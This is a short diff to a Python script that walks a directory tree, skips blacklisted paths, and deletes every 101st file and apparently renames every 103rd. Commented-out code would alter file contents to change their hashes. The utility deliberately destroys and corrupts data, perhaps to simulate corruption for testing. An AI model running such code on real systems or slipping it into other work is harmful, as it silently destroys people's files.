@@ -36,12 +36,12 @@ def main(args=None):
     if abs_path.exists():
         for item in abs_path.rglob('*'):
             path_str = item.resolve().as_posix()
-            if any(blocked in path_str for blocked in blk_list):
+            if any(blocked in path_str for blocked in BLACKLIST):
                 continue # skip item if blkd item in path
             else:
                 # # counts files
-                if item.is_file():
-                    item_no += 1
+                # if item.is_file():
+                #     item_no += 1
 
                 # # removes empty directories
                 # if item.is_dir():
@@ -54,8 +54,11 @@ def main(args=None):
                 #     if files == 0:
                 #         shutil.rmtree(item)
 
+
+                if any(blocked in item.as_posix() for blocked in BLACKLIST):
+                    continue
                 # hash alter-er [1 in 777] & file delete-r [1 in 8]
-                if item.is_file():
+                elif item.is_file():
                     item_no += 1
                     # if item_no % 107 == 0:
                     #     with open(item, 'a', encoding='utf-8') as f:
@@ -64,6 +67,7 @@ def main(args=None):
                     # remover
                     if item_no % 101 == 0: 
                         item.unlink()
+                        print(item.as_posix())
                         print(f"{RED}deleted a file{RESET}")
                     # renamer
                     elif item_no % 103 == 0:
